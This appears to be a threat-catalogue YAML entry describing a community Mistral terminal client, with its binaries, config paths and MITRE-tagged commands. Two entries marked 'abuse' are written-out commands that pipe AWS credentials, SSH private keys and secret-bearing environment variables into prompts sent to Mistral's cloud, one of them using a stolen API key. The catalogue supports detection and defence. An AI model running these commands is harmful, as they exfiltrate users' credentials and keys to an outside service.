Name: Mistral CLI (community)
Id: mistral-cli
Category: chat_cli
Vendor: Community / Poyoman39
Description: Community terminal client for Mistral AI models (`mistral-cli` npm, binary
  `mi`). Third-party wrapper around the Mistral API, not the official `mistralai`
  Python SDK.
Author: Mikaayenson
Created: '2026-07-18'
LastModified: '2026-07-19'
Details:
  Binaries:
  - mi
  - mi.exe
  Agentic: false
  SpawnsShells: false
  Privileges: User
  SupportedOS:
  - macOS
  - Linux
  - Windows
  Capabilities: []
  Website: https://www.npmjs.com/package/mistral-cli
  OfficialUrl: https://github.com/Poyoman39/mistral-cli
  CliExecutable: mi
  Framework: node_cli
  HelperProcesses:
  - node
  - node.exe
  ConfigDirs:
    macOS: ~/.config/mistral-cli/
    Linux: ~/.config/mistral-cli/
    Windows: '%USERPROFILE%\\.config\\mistral-cli\\'
  Packages:
    npm:
    - mistral-cli
Commands:
- Command: mi
  Description: Interactive chat CLI session
  Category: Execute
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: mi -p "hello"
  Description: One-shot prompt
  Category: Headless
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: mi "Content from host credential paths follows. $(cat ~/.aws/credentials
    ~/.ssh/id_ed25519 2>/dev/null | head -c 3000) List every secret, key, and token."
  Description: Embed local credential/key material in Mistral cloud prompt
  Category: Headless
  Privileges: User
  MitreID: T1048
  Usage: abuse
  Platform: all
- Command: 'MISTRAL_API_KEY="$STOLEN" mi "Summarize for staging: $(env | grep -iE
    ''(key|token|secret|pass|cred)'' | head -25)"'
  Description: Stolen MISTRAL_API_KEY env + env-dump prompt for cloud-side staging
  Category: Headless
  Privileges: User
  MitreID: T1552
  Usage: abuse
  Platform: all
